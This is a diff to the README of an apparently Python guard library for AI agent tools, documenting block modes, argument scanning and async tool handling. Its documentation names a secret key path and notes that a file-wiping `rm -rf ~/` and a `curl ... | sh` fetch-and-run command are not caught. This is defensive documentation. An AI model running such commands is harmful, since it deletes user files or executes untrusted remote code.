@@ -117,6 +117,10 @@ print(get_user_profile("user_123"))
 
 Arguments are checked before the function runs; with `on_block="raise"` a blocked call raises `GuardBlockError`. `mask_secrets` is off by default in `@guard`.
 
+`on_block="return"` returns `fallback` instead of running the function. `on_block="custom"` calls `callback(assessment, function_name, payload)` and then raises `GuardBlockError`, unless your callback raises its own exception first; it needs a `callback`, and without one the decorator raises `ValueError`. In every mode a blocked call does not run the function.
+
+The checks read every string inside the arguments: dict keys and values, lists, tuples, sets, dataclasses, pydantic models and the attributes of other objects (the `self` or `cls` of a method is skipped). A generator or other one-shot iterator is blocked (rule `type:unscannable`), because checking it would use it up: pass a list instead. Strings longer than 256 KB are checked in overlapping windows up to 4 MB; past that the result has `truncated=True`, and `block_truncated=True` or `ZN_BLOCK_TRUNCATED=1` blocks it (rule `size:truncated`).
+
 `@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
 
 ### LangChain / LangGraph
@@ -166,7 +170,7 @@ def query_knowledge_base(query: str) -> str:
 
 `check_result=True` also scans what the tool returns for prompt injection before the agent sees it (off by default, so existing tools behave as before).
 
-`guarded_tool` also works on `async def` tools and on callable objects whose `__call__` is `async def`: the call is awaited, then the output is checked and masked exactly as for a sync tool. A sync function that returns a coroutine, and an async generator, are not checked or masked, so declare the tool with `async def` instead.
+`guarded_tool` also works on `async def` tools and on callable objects whose `__call__` is `async def`: the call is awaited, then the output is checked and masked exactly as for a sync tool. A sync function that returns a coroutine is not checked or masked, so declare the tool with `async def` instead. With `check_result=True`, a tool that returns a generator or an async generator is blocked, because its output cannot be checked without using it up.
 
 ### LlamaIndex
 
